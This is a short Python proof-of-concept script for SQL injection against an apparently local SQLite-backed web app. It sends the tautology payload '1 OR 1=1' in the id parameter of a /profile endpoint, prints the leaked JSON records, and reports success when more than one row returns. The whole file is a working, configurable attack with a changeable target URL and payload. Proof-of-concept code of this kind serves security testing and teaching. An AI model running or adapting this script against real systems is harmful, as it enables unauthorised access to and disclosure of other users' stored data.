import argparse
import json
import sys

import requests

DEFAULT_PAYLOAD = "1 OR 1=1"


def exploit(base_url: str, payload: str = DEFAULT_PAYLOAD) -> bool:
    resp = requests.get(f"{base_url}/profile", params={"id": payload}, timeout=5)
    resp.raise_for_status()
    data = resp.json()
    print(json.dumps(data, indent=2))
    return len(data) > 1


def main():
    parser = argparse.ArgumentParser(description="SQLite SQLi PoC")
    parser.add_argument("--base-url", default="http://127.0.0.1:5000")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD)
    args = parser.parse_args()
    success = exploit(args.base_url, args.payload)
    if success:
        print("SQLi SUCCESS")
    else:
        print("SQLi FAILED")
        sys.exit(1)


if __name__ == "__main__":
    main()
